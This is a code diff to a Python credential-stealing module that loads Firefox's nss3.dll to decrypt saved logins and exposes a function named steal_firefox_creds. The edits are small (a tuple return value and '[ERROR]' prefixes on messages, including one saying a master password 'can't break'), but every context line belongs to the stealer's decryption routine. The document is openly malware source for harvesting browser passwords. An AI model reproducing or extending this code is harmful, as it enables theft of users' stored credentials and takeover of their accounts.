@@ -15,7 +15,7 @@ def __find_file(name, path):
     for root, dirs, files in os.walk(path):
         if name in files:
             return root, os.path.join(root, name)
-    return None
+    return None, None
 
 
 def __get_host_drives():
@@ -36,7 +36,7 @@ def __load_nss3_dll_libarary():
     nss3_dll_libarary_path = __search_nss3_dll_libarary_path()
     if nss3_dll_libarary_path:
         return CDLL(nss3_dll_libarary_path)
-    raise NSS3NotFoundError("nss3.dll was not found in the firefox installation folder")
+    raise NSS3NotFoundError("[ERROR] nss3.dll was not found in the firefox installation folder")
 
 
 def __set_nss3_attr_and_res(nss3):
@@ -109,9 +109,9 @@ def __decrypt_firefox_creds(nss3, logins):
 
             return cracked_logins
         else:
-            raise MasterPasswordDetected("Master password detected, need to implement crack feature")
+            raise MasterPasswordDetected("[ERROR] Master password detected, can't break")
     else:
-        raise NSS3KeySlotCreationError("Couldn't create nss3 keyslot")
+        raise NSS3KeySlotCreationError("[ERROR] Couldn't create nss3 keyslot")
 
 
 def steal_firefox_creds(): # get firefox credentials
